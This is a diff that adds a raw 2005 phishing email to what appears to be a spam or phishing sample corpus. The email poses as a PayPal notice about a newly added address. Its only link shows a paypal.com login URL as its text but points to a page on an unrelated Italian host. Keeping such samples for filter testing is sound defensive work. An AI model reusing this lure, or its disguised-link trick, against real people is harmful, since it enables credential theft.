@@ -1,0 +1,143 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <service@intl.paypal.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+ by naughty.domain.com (Postfix) with ESMTP id 6CBCE536E59
+ for <username@login.domain.com>; Wed, 12 Oct 2005 08:43:00 -0400 (EDT)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+ by mail2.domain.com (Postfix) with ESMTP id 801666FA3B3
+ for <username@domain.com>; Wed, 12 Oct 2005 08:42:55 -0400 (EDT)
+Received: from smtp101.biz.mail.mud.yahoo.com (smtp101.biz.mail.mud.yahoo.com
+ [68.142.200.236]) by mail2.domain.com (Postfix) with SMTP
+ for <username@domain.com>; Wed, 12 Oct 2005 08:42:55 -0400 (EDT)
+Received: (qmail 14280 invoked from network); 12 Oct 2005 12:42:54 -0000
+Received: from unknown (HELO User) (37@cincisute.info@71.104.229.67 with login)
+ by smtp101.biz.mail.mud.yahoo.com with SMTP; 12 Oct 2005 12:42:52 -0000
+Reply-To: <service@intl.paypal.com>
+From: "service@intl.paypal.com" <service@intl.paypal.com>
+Subject: New email address added to your PayPal account 
+Date: Wed, 12 Oct 2005 05:44:50 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ****
+X-Spam-Status: No, score=4.9 required=5.0 tests=FORGED_MUA_OUTLOOK,
+ FORGED_OUTLOOK_HTML,FORGED_OUTLOOK_TAGS,HTML_MESSAGE,MIME_HTML_ONLY,
+ MISSING_HEADERS,NO_REAL_NAME autolearn=no version=3.0.2
+X-Spam-Report: *  0.0 NO_REAL_NAME From: does not include a real name
+ *  0.1 MISSING_HEADERS Missing To: header
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  0.1 FORGED_OUTLOOK_TAGS Outlook can't send HTML in this format
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+Message-Id: <20051012124255.801666FA3B3@mail2.domain.com>
+To: undisclosed-recipients: ;
+X-Keywords: 
+X-UID: 338
+Status: O
+Content-Length: 3857
+Lines: 95
+
+<html>
+<head>
+<title>PayPal</title>
+<style type="text/css">
+.dummy {}
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+LI {line-height: 120%;}
+UL.ppsmallborder {margin:10px 5px 10px 20px;}
+LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+UL.pp_narrow {margin:10px 5px 0px 40px;}
+hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+.pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+.pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+.pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+.pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+.pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}
+.pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}
+.pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}
+.pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}
+.pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+.pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+.pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+.pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.ppem106 {font-weight: 700;}
+</style>
+</head>
+<body bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+<tr valign="top">
+<td><A href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal"
+border="0" width="255" height="35"></A>
+</td>
+</tr>
+</table>
+<table width="750" cellspacing="0" cellpadding="0" border="0" height="316">
+<tr>
+<td background="http://images.paypal.com/images/bg_clk.gif"
+width=750 height="29"><img src="http://images.paypal.com/images/pixel.gif" height="29"
+width="1" border="0"></td>
+</tr>
+<tr>
+<td height="287" width="750"><b><img src="http://images.paypal.com/images/pixel.gif" height="10"
+width="1" border="0"></b><p><span class="treb">You have added Meri624292@aol.com as
+    a new email address for your PayPal account. <br>
+    <br>
+    If you did not authorize this change or if you need assistance with your 
+    account, please contact PayPal customer service at: <br>
+    <br>
+    </span><b>
+    <a href="http://host50-156.pool80207.interbusiness.it/.online/tcpsupport/primapagina.php">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></b><span class="treb"><br>
+    <br>
+    Thank you for using PayPal!<br>
+    The PayPal Team <br>
+    <br>
+    Please do not reply to this e-mail. Mail sent to this address cannot be
+    answered. For assistance, log in to your PayPal account and choose the
+    &quot;Help&quot; link in the header of any page. <br>
+    <br>
+    -------------------------------------- <br>
+    <br>
+    PROTECT YOUR PASSWORD NEVER give your password to anyone and ONLY log in at
+    https://www.paypal.com/. Protect yourself against fraudulent websites by 
+    opening a new web browser (e.g. Internet Explorer or Netscape) and typing in
+    the PayPal URL every time you log in to your account. <br>
+    <br>
+    ------------------------------------- <br>
+    <br>
+    PayPal Email ID PP694182 <br>
+    </span><b><br>
+    </b><br>
+&nbsp;</td>
+</tr>
+</table>
+</body>
+</html>
